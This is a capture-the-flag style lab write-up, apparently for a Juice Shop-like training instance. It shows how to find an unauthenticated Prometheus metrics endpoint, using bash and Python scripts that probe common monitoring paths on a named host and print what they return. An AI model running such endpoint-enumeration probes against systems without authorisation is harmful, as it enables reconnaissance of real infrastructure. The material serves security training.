# Challenge 8: Exposed Metrics

## Difficulty: ⭐ (1/5)

## Objective
Find and access the exposed metrics endpoint that should not be public.

## Vulnerability
Prometheus metrics endpoint is exposed without authentication.

## Solution

### Direct Access
Simply navigate to: `https://[your-instance].wonkatech.org/metrics`

### Discovery Methods
1. Check common monitoring endpoints
2. Look for references in JavaScript files
3. Check robots.txt for disallowed paths

## Automated Script:
```bash
#!/bin/bash
# save as: exposed_metrics.sh

TARGET="https://juice3.wonkatech.org"

echo "📊 Finding Exposed Metrics..."

# Common metrics endpoints
ENDPOINTS=(
    "/metrics"
    "/prometheus"
    "/health"
    "/status"
    "/_metrics"
    "/api/metrics"
    "/admin/metrics"
)

for endpoint in "${ENDPOINTS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${endpoint}")
    if [ "$STATUS" = "200" ]; then
        echo "✅ Found metrics at: ${TARGET}${endpoint}"
        echo "Sample output:"
        curl -s "${TARGET}${endpoint}" | head -20
        break
    fi
done
```

## Python Automation:
```python
#!/usr/bin/env python3
# save as: challenge_08_exposed_metrics.py

import requests

def find_exposed_metrics(base_url):
    """Find exposed metrics endpoints"""
    
    print(f"🎯 Challenge 8: Exposed Metrics on {base_url}")
    
    # Common metrics endpoints
    endpoints = [
        "/metrics",
        "/prometheus",
        "/health",
        "/status",
        "/_metrics",
        "/api/metrics",
        "/admin/metrics",
        "/actuator/metrics",
        "/monitoring"
    ]
    
    print("\n📊 Checking for metrics endpoints...")
    
    for endpoint in endpoints:
        try:
            url = f"{base_url}{endpoint}"
            response = requests.get(url, timeout=5)
            
            if response.status_code == 200:
                # Check if it's actually metrics
                metrics_indicators = [
                    "# HELP", "# TYPE",  # Prometheus format
                    "process_cpu", "http_requests",
                    "memory_usage", "gc_collection",
                    "up{", "gauge", "counter"
                ]
                
                if any(indicator in response.text for indicator in metrics_indicators):
                    print(f"✅ Found metrics at: {url}")
                    print("\n📈 Sample metrics:")
                    for line in response.text.split('\n')[:10]:
                        print(f"  {line}")
                    
                    print(f"\n🎉 Challenge completed!")
                    print(f"📎 Direct link: {url}")
                    return url
                    
        except Exception as e:
            pass
    
    print("\n💡 The metrics endpoint is typically at /metrics")
    print(f"Try: {base_url}/metrics")

if __name__ == "__main__":
    BASE_URL = "https://juice3.wonkatech.org"
    find_exposed_metrics(BASE_URL)
```

## What You'll Find
The metrics endpoint typically exposes:
- HTTP request counts and latencies
- Memory usage statistics
- CPU usage
- Garbage collection stats
- Application-specific metrics
- Database connection pool stats

## Example Metrics Output:
```
# HELP process_cpu_user_seconds_total Total user CPU time spent in seconds.
# TYPE process_cpu_user_seconds_total counter
process_cpu_user_seconds_total 0.456

# HELP nodejs_heap_size_total_bytes Process heap size from node.js in bytes.
# TYPE nodejs_heap_size_total_bytes gauge
nodejs_heap_size_total_bytes 118231040
```

## Learning Points
- Metrics endpoints should require authentication
- Sensitive operational data can be exposed through metrics
- Prometheus/Grafana endpoints are common targets
- Always secure monitoring infrastructure